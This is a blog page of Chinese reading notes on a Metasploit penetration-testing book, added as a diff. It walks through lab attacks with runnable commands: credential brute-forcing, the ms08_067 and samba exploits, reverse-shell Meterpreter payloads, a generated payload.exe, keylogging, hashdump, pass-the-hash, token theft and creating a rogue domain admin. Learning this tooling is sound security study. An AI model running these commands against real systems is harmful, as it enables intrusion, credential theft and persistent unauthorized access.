@@ -1,0 +1,970 @@
+<!DOCTYPE html>
+
+
+<html lang="zh_CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta name="description" content="Limbus的个人博客" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>Metasploit渗透测试指南 |  Limbus&#39; Blog</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/H-Limbus/h-limbus.github.io@latest/favicon.png" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?afbc0b35e48d80d18aee387ad0d30121";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    <link rel="alternate" href="/atom.xml" title="Limbus' Blog" type="application/atom+xml">
+</head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Metasploit渗透测试指南"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Metasploit渗透测试指南
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/05/17/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/" class="article-date">
+  <time datetime="2023-05-17T12:56:14.950Z" itemprop="datePublished">2023-05-17</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a> / <a class="article-category-link" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/">Metasploit渗透测试指南</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">10k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">38 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h3 id="0x00-情报收集"><a href="#0x00-情报收集" class="headerlink" title="0x00 情报收集"></a>0x00 情报收集</h3><h4 id="1-被动信息收集"><a href="#1-被动信息收集" class="headerlink" title="1. 被动信息收集"></a>1. 被动信息收集</h4><p>在不接触到目标系统的情况下挖掘目标信息。</p>
+<ol>
+<li><p>whois 查询</p>
+<p>msf中也有whois，在外部也可以用whois查询。</p>
+</li>
+<li><p>Netcraft</p>
+<p>是一个网页界面工具，查询网站IP</p>
+</li>
+<li><p>NsLookup</p>
+<p>获取关于服务器的附加信息</p>
+<span id="more"></span>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">&gt;set ty=mx</span><br><span class="line">&gt;secmaniac.net</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="2-主动信息收集"><a href="#2-主动信息收集" class="headerlink" title="2. 主动信息收集"></a>2. 主动信息收集</h4><ol>
+<li><p>nmap 端口扫描</p>
+<p>在metasploit中集成了nmap，甚至可以将nmap的扫描结果保存到msf 数据库中，然后进行查看。</p>
+<p>关于nmap 扫描的用法可以看我的这篇文章。</p>
+</li>
+<li><p>高级Nmap扫描技巧：TCP空闲扫描</p>
+<p>这种扫描能让我们冒充网络上另一台主机的IP地址，扫描之前，需要在网络上定位一台使用递增IP帧标识机制的空闲主机。</p>
+<p>可以使用MSF框架的 scanner&#x2F;ip&#x2F;ipidseq 模块，来寻找能满足TCP空闲扫描要求的空闲主机。RHOST 参数可以使用IP地址段，CIDR(无类型域间选路)地址块（如192.168.1.0&#x2F;24）。</p>
+<p>找到空闲IP主机后，我们尝试在nmap中使用-sI选项指定找到的空闲IP主机对目标进行扫描。</p>
+<p><code>msf6&gt;nmap -PN -sI 192.168.1.109 192.168.1.255</code></p>
+</li>
+<li><p>使用MSF进行端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入以下命令查看有哪些端口扫描工具</span><br><span class="line">msf6&gt; search portscan</span><br><span class="line"></span><br><span class="line">下面我们使用msf的SYN端口扫描器对单个主机进行一次简单的扫描</span><br><span class="line">use scanner/portscan/syn</span><br><span class="line">set RHOST 192.168.1.155</span><br><span class="line">set THREADS 50</span><br><span class="line">run </span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="3-针对性扫描"><a href="#3-针对性扫描" class="headerlink" title="3. 针对性扫描"></a>3. 针对性扫描</h4><ol>
+<li><p>服务器消息块协议扫描</p>
+<p>msf可以用smb_version 模块来遍历一个网络，并获取windows系统的版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use scanner/smb/smb_version</span><br><span class="line">set RHOSTS 192.168.1.155</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>搜索配置不当的microsoft SQL Server</p>
+<p>配置不当的MSSQL通常是进入目标系统的第一个后门，MSSQL默认监听在TCP端口1433上或者使用随机动态端口。如果使用随机的TCP端口，只需要对UDP端口1434进行查询，便可以知道那个端口。mssql_ping 可以来做这个。由于mssql_ping使用UDP协议，扫描外网时很慢，但扫描内网时较快。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use scanner/mssql/mssql_ping</span><br><span class="line">set RHOSTS 192.168.1.0/24</span><br><span class="line">set THREADS 255</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>SSH服务器扫描</p>
+<p>使用ssh_version 模块来识别目标服务器上运行的SSH版本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use scanner/ssh/ssh_version</span><br><span class="line">set THREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>FTP扫描</p>
+<p>FTP是一种复杂且缺乏安全性的应用层协议。使用ftp_version 模块对ftp扫描</p>
+<p>使用方式和之前一样，扫描出来ftp服务器之后，我们可以使用msf中的 scanner&#x2F;ftp&#x2F;anonymous模块检查这台服务器是否允许匿名用户登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/anonymous</span><br><span class="line">set RHOSTS 192.168.1.0/24</span><br><span class="line">set THREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>简单网管协议扫描</p>
+<p>简单网管协议扫描(SNMP)通常用于网络设备中，用来报告带宽利用率、冲突率以及其他信息。一些操作系统也包含SNMP服务软件，主要用于提供类似CPU利用率 、空闲内存等其他系统信息。</p>
+<p>msf中包含一个内置的辅助模块 scanner&#x2F;snmp&#x2F;snmp_enum，专用与snmp扫描。</p>
+<p>为了获取管理一台交换机的权限，首先需要找到SNMP团体字符串，利用MSF中的scanner&#x2F;snmp&#x2F;snmp_login模块。</p>
+</li>
+</ol>
+<h3 id="0x01-漏洞扫描"><a href="#0x01-漏洞扫描" class="headerlink" title="0x01 漏洞扫描"></a>0x01 漏洞扫描</h3><p>可以手动扫描，也可以利用一些漏洞扫描工具，NeXpose, Nessus.</p>
+<h4 id="1-基本的漏洞扫描"><a href="#1-基本的漏洞扫描" class="headerlink" title="1. 基本的漏洞扫描"></a>1. 基本的漏洞扫描</h4><p>netcat 获取目标192.168.1.203 的旗标，许多网络服务，一旦连接到它们的服务端口或向它们发送特定指令，就可以获取旗标</p>
+<p><code>nc 192.168.1.203 80</code></p>
+<p>有些可以判断网站的服务器</p>
+<h4 id="2-对于NeXpose-和-Nessus-的介绍"><a href="#2-对于NeXpose-和-Nessus-的介绍" class="headerlink" title="2. 对于NeXpose 和 Nessus 的介绍"></a>2. 对于NeXpose 和 Nessus 的介绍</h4><p>略</p>
+<h4 id="3-专用漏洞扫描器"><a href="#3-专用漏洞扫描器" class="headerlink" title="3. 专用漏洞扫描器"></a>3. 专用漏洞扫描器</h4><ol>
+<li><p>验证SMB登录</p>
+<p>可以使用SMB登录扫描器对于大量主机的用户名和口令进行猜解，扫描动静大，每次登录都会被目标主机记录。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set RHOSTS 192.168.1.13-155</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set SMBPass s3cr3t</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>扫描开放的VNC空口令</p>
+<p>VNC（虚拟网络计算）提供了图形化的远程系统访问方式，实现类似与微软的远程桌面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/vnc/vnc_none_auth</span><br><span class="line">set RHOSTS 192.168.1.155</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>找到VNC服务器之后，可以使用vncviewer连接VNC服务器。</p>
+</li>
+<li><p>扫描开放的X11服务器</p>
+<p>msf 的内置open_x11扫描器与vnc_auth 扫描器类似。该服务器允许用户无需身份认证即可连接，但是不广泛。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/x11/open_x11</span><br><span class="line">set RHOSTS 192.168.1.0/24</span><br><span class="line">set THREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>找到之后可以使用xspy 工具对目标的键盘输入进行记录。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xspy -display 192.168.1.123:0 -delay 100</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="4-利用扫描结果进行自动化攻击"><a href="#4-利用扫描结果进行自动化攻击" class="headerlink" title="4. 利用扫描结果进行自动化攻击"></a>4. 利用扫描结果进行自动化攻击</h4><p>msf 中的 Autopwn 工具能够自动选择目标，并利用已开放端口或漏洞扫描结果，对目标进行自动化的渗透攻击。可以利用大多数漏洞扫描器的结果来执行Autopwn。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">演示导入Nessus扫描结果对其进行自动化渗透攻击。使用db_connect 命令创建一个新数据库，并使用db_import 命令导入扫描报告，然后开始运行 db_autopwn 对目标发起攻击（e），显示所有匹配的模块（t），使用反弹shell的攻击荷载（r），根据漏洞选择攻击模块（x），根据开放端口选择攻击模块（p）.如果攻击成功，会返回一个被攻击计算机的控制shell.</span><br><span class="line">db_connect postgres:toor@127.0.0.1/msf6</span><br><span class="line">db_import /root/nessus.nbe</span><br><span class="line">db_autopwn -e -t -r -x -p</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-渗透攻击之旅"><a href="#0x02-渗透攻击之旅" class="headerlink" title="0x02 渗透攻击之旅"></a>0x02 渗透攻击之旅</h3><h4 id="1-渗透攻击基础"><a href="#1-渗透攻击基础" class="headerlink" title="1. 渗透攻击基础"></a>1. 渗透攻击基础</h4><ol>
+<li><p>show exploits：这个命令会显示msf 框架中所有可用的渗透攻击模块</p>
+</li>
+<li><p>show auxiliary：这个命令会显示所有的辅助模块以及它们的用途，非常广泛，有扫描器、拒绝服务攻击工具、Fuzz测试器</p>
+</li>
+<li><p>show options：各个模块正确运行所需的各种设置，当没有选择模块时，输入这个命令会显示所有的全局参数。可以修改全局参数中的LogLevel，输入back可以返回上一个状态。</p>
+<p>使用search 搜索想要查找的某个特定的渗透攻击、辅助或攻击荷载模块。</p>
+</li>
+<li><p>show payloads：msf 会将与当前模块兼容的攻击荷载显示出来，在针对基于windows操作系统的攻击中，攻击荷载可能只会返回目标主机的一个命令行界面，复杂的能够返回一个完整的图形操作界面，在主界面输入这个会返回所有的攻击荷载。使用set payload windows&#x2F;shell&#x2F;reverse_tcp 选择攻击模块。</p>
+</li>
+<li><p>show targets：渗透攻击模块通常可以列出受到漏洞影响目标系统的类型。</p>
+</li>
+<li><p>info：当show和search 提供的信息过于简短，可以选择info 命令加上模块的名字来显示次模块的详细信息、参数说明以及所有可用的目标操作系统。</p>
+</li>
+<li><p>set 和 unset ：msf 模块中的参数只有两个状态：已设置和未设置。有些参数会被标记为必填项（required），必须要经过手工设置处于启用状态。</p>
+</li>
+<li><p>setg 和 unsetg ：setg命令和unsetg命令能够对全局参数进行设置或清除。这样就不必每次遇到某个参数都要重新设置。</p>
+</li>
+<li><p>save：使用setg 命令对全局参数进行设置后，可以使用save命令将当前的设置值保存下来。下次依然存在。</p>
+</li>
+</ol>
+<h4 id="2-攻击一台Ubuntu-主机"><a href="#2-攻击一台Ubuntu-主机" class="headerlink" title="2. 攻击一台Ubuntu 主机"></a>2. 攻击一台Ubuntu 主机</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; nmap -sT -A -P0 192.168.33.132</span><br><span class="line">通过nmap扫描发现3个开放端口，80，139，445.而且告诉我们这台主机操作系统为Ubuntu，而且看见它正运行着Samba 3.x服务和附带PHP 5.2.1的Apache 2.2.3服务。</span><br><span class="line">search samba</span><br><span class="line">use linux/samba/lsa_transnames_heap</span><br><span class="line">set payload linux/x86/shell_bind_tcp</span><br><span class="line">set LPORT 8080</span><br><span class="line">set RHOST 192.168.33.132</span><br><span class="line">exploit</span><br><span class="line">这种类型的攻击称为堆溢出攻击，使用动态内存分配中的漏洞来触发攻击代码，这种攻击不是100%可靠的，可以多试几次。</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-全端口攻击荷载：暴力猜解目标开放的端口"><a href="#3-全端口攻击荷载：暴力猜解目标开放的端口" class="headerlink" title="3. 全端口攻击荷载：暴力猜解目标开放的端口"></a>3. 全端口攻击荷载：暴力猜解目标开放的端口</h4><p>当攻击目标内部设置了很严格的端口过滤时，msf 提供了一个专用的攻击荷载帮助我们找到开放的端口。下面使用这个攻击荷载，会尝试所有端口进行连接，直到找到成功连接的端口为止。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use windows/smb/ms08_067_netapi</span><br><span class="line">set LHOST 192.168.76.128</span><br><span class="line">set RHOST 192.168.76.130</span><br><span class="line">set TARGET 3</span><br><span class="line">search ports</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp_allports</span><br><span class="line">exploit -j</span><br><span class="line">sessions -l -v</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-资源文件"><a href="#4-资源文件" class="headerlink" title="4. 资源文件"></a>4. 资源文件</h4><p>资源文件是MSF终端内包含一系列自动化命令的脚本文件，这些文件实际上是一个可以在MSF终端中执行的命令列表，列表中的命令将顺序执行，减少测试时间。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/opt/framework3/msf3/ echo version &gt; resource.rc</span><br><span class="line">/opt/framework3/msf3/ echo sounds &gt;&gt; resource.rc</span><br><span class="line">msfconsole -r resource.rc</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-Meterpreter"><a href="#0x03-Meterpreter" class="headerlink" title="0x03 Meterpreter"></a>0x03 Meterpreter</h3><p>Meterpreter 是Metasploit 框架的一个扩展模块，可以调用Metasploit 的一些功能，对系统进行更为深入的渗透，这些功能包括反追踪、纯内存工作模式、密码哈希值获取、特权提升、跳板攻击等等。</p>
+<h4 id="1-攻陷Windows-XP虚拟机"><a href="#1-攻陷Windows-XP虚拟机" class="headerlink" title="1. 攻陷Windows XP虚拟机"></a>1. 攻陷Windows XP虚拟机</h4><p>在纤细介绍Meterpreter的功能特性之前，我们必须首先攻陷一台系统并取得一个Meterpreter shell。</p>
+<ol>
+<li><p>使用Nmap 扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -A -P0 192.168.33.130</span><br><span class="line">通过端口扫描可以看到，开放了MSSQL，FTP,SMTP端口，这几个端口都可能存在可被利用的漏洞。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>攻击MSSQL</p>
+<p>我们将对MSSQL的1433端口进行攻击，尝试对MSSQL服务进行暴力破解以获取密码，MSSQL默认安装在TCP1433端口和UDP1434端口，新版本的MSSQL允许随机安装到TCP端口，可以用UDP端口来查询获取SQL服务的TCP动态端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU 192.168.33.130 -p 1434</span><br></pre></td></tr></table></figure>
+
+<p>以MSSQL为目标，我们可以使用mssql_ping 模块来找出MSSQL 服务端口，并进行用户名与口令的猜测。MSSQL在初次安装的时候需要用户创建sa或系统管理员用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use scanner/mssql/mssql_ping</span><br><span class="line">set RHOSTS 192.168.33.1/24</span><br><span class="line">set THREADS 50</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>暴力破解MSSQL服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use scanner/mssql/mssql_login</span><br><span class="line">set PASS_FILE /pentest/exploits/fasttrack/bin/dict/dict/wordlist.txt</span><br><span class="line">set RHOSTS 192.168.33.130</span><br><span class="line">set THREADS 10</span><br><span class="line">set verbose false</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>xp_cmdshell</p>
+<p>以sa管理员账户权限允许MSSQL时，我们可以执行xp_cmdshell存储过程，该存储过程允许我们直接与底层操作系统进行交互并执行命令。xp_cmdshell是SQL Server中缺省装载的内建存储程序。所以一旦获取sa用户，就可以同时以管理员身份访问MSSQL和底层操作系统。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use windows/mssql/mssql_payload</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.33.129</span><br><span class="line">set LPORT 443</span><br><span class="line">set RHOST 192.168.33.130</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>成功的话会获取meterpreter shell。</p>
+</li>
+<li><p>Meterpreter 基本命令</p>
+<ol>
+<li><p>截屏    meterpreter &gt; screenshot</p>
+</li>
+<li><p>sysinfo  获取系统运行的平台</p>
+</li>
+</ol>
+</li>
+<li><p>获取键盘记录</p>
+</li>
+</ol>
+<p>要获取系统的密码，可以破解或攻击的方法，也可以远程主机上进行键盘记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">先获取目标系统正在运行的进程</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line">使用migrate命令将会话迁移至explorer.exe 的进程空间</span><br><span class="line">meterpreter &gt; migrate 1668</span><br><span class="line">之后启动keylog_recorder模块</span><br><span class="line">run post/windows/capture/keylog_recorder</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-挖掘用户名和密码"><a href="#2-挖掘用户名和密码" class="headerlink" title="2 挖掘用户名和密码"></a>2 挖掘用户名和密码</h4><p>使用Meterpreter来获取系统本地文件中的用户名和密码哈希值</p>
+<ol>
+<li><p>提取密码哈希值</p>
+<p>本次攻击使用Meterpreter 中的hashdump输入模块，来提取系统的用户名和密码哈希值，微软Windows系统存储哈希值的方式一般为LAN Manager(LM)、NTLAN Manager(NTLM)、或者NTLAN Manager v2(NTLMv2).</p>
+<p>在LM存储方式中，当用户首次输入密码或更改密码时，密码被转换为哈希值，由于哈希长度限制，将密码切分为7个字符一组的哈希值。以password123456的密码为例，哈希值以passwor和d123456的方式存储，所以攻击者只需要简单地破解7个字符一组的密码，而不是原始的14个字符。而NTLM的存储方式和密码长度无关，密码password123456将作为整体转换为哈希值存储。</p>
+<p>如下内容是我们提取的UID为500的Administrator用户账户的密码哈希值，</p>
+<p>Administrator:500:xxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxx:::</p>
+<p>第一个哈希是LM哈希值，第二个是NTLM哈希值。</p>
+</li>
+<li><p>使用Meterpreter 命令获取密码哈希值</p>
+<p>在目标机上重置一个复杂的密码。然后使用Meterpreter 重新获取目标系统上的用户名和密码哈希值，使用use priv命令，意味着运行在特权账号上。</p>
+<p>获取安全账号管理器（SAM）数据库，我们需要运行在System权限下，以绕过注册表的限制，获取受保护的存有Windows用户名和密码的SAM存储。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use priv</span><br><span class="line">meterpreter &gt; post/windows/gather/hashdump</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435xxxxxxxxxxxxxxxxxxx:b75989fxxxxxxxxxxxxxxxx:::</span><br><span class="line">以aad3b435开头的哈希值是一个空的或不存在的哈希值。是因为我们之前设置的密码长度超过14个字符，所以不会存储为LM值，只能存储为NTLM。</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="3-传递哈希值"><a href="#3-传递哈希值" class="headerlink" title="3 传递哈希值"></a>3 传递哈希值</h4><p>在上面的例子中我们已经获取到了管理员用户名和密码，但我们短时间破解不了，那么如何通过这个用户账号登录到更多的主机，入侵更多的系统呢。</p>
+<p>这里用到哈希值传递技术，有哈希值就够了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use windows/smb/psexec</span><br><span class="line">set pAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.33.129</span><br><span class="line">set LPORT 443</span><br><span class="line">set RHOST 192.168.33.130</span><br><span class="line">set SMBPass aad3435xxxxxxxxxxxxx:xxxxxxxxxxxxxxxx</span><br><span class="line">exploit</span><br><span class="line">即可以获取Meterpreter会话。</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-权限提升"><a href="#4-权限提升" class="headerlink" title="4 权限提升"></a>4 权限提升</h4><p>现在我们获得了目标系统的访问权限，可以通过net user命令创建限制权限的普通用户账号，我们将示例讲解如何创建新的用户并对其权限进行提升。</p>
+<p>在目标机上输入以下命令</p>
+<p><code>net user bob password123 /add</code></p>
+<p>然后创建一个基于Meterpreter 的攻击荷载程序–payload.exe，复制到目标XP机上，并在bob用户账户下运行。使用攻击荷载生成器（msfpaload）来创建以普通windows可执行文件格式的Meterpreter攻击荷载程序payload.exe。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.33.129 LPORT=443 X &gt; payload.exe</span><br><span class="line">调用msfcli接口进行监听并等待连接。</span><br><span class="line">msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.33.129 LPORT=443 E</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">&gt; net user bob</span><br><span class="line">我们发现账户权限受限，查询完毕后，按CTRL-Z键退出shell并保留merterpreter 会话。</span><br></pre></td></tr></table></figure>
+
+<p>现在我们来获取管理员权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; use priv</span><br><span class="line">meterpreter&gt; getsystem</span><br><span class="line">meterpreter&gt; getuid</span><br><span class="line">我们可以使用rev2setf命令，切换回Meterpreter shell会话中的初始用户账户。</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-令牌假冒"><a href="#5-令牌假冒" class="headerlink" title="5 令牌假冒"></a>5 令牌假冒</h4><p>我们将攫取目标系统中的一个Kerberos令牌，将其用在身份认证环节，来假冒当初创建这个令牌的用户。</p>
+<h4 id="6-使用-ps"><a href="#6-使用-ps" class="headerlink" title="6 使用 ps"></a>6 使用 ps</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; ps</span><br><span class="line"></span><br><span class="line">PID Name    Arch  Session  User      Path</span><br><span class="line">380  cmd.exe  x86     0    SNWAKS.IN\ihazdomainadmin           \System\</span><br><span class="line">会列出当前运行的应用程序以及运行这些的用户账户，我们所在域的名字是SNEAKS.IN，域管理用户名为ihazdomainadmin</span><br></pre></td></tr></table></figure>
+
+<p>使用steal_token命令和PID参数来盗取域管理员用户的令牌</p>
+<p><code>meterpreter &gt; steal_token 380</code></p>
+<p>现在已经成功假冒了域管理员账号，现在meterpreter是以域管理员用户来运行了。</p>
+<p>某些情况下ps命令不能列出域管理员运行的进程，我们可以使用incognito命令列举出系统上可以利用的令牌。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito</span><br><span class="line">通过list_tokens -u 命令列举出令牌</span><br><span class="line">&gt; list_tokens -u</span><br><span class="line">扮演ihazdomainadmin令牌并添加一个新用户，然后给它域管理员权限</span><br><span class="line">meterpreter &gt; impersonate_token SNEAKS.IN\\ihazdomainadmin</span><br><span class="line">meterpreter &gt; add_user omgcompromised p@55w0rd! -h 192.168.33.50</span><br><span class="line">meterpreter &gt; add_group_user &quot;Domain Admins&quot; omgcompromised -h 192.168.33.50</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-通过跳板"><a href="#7-通过跳板" class="headerlink" title="7 通过跳板"></a>7 通过跳板</h4><p>跳板攻击（Pivoting）是msf 提供的一种攻击方法，允许从msf 终端攻击网络中的其他系统。可以任意利用这台机器作为跳板攻击网络中的其他系统，或者访问由于路由问题而不能直接访问的内网系统。</p>
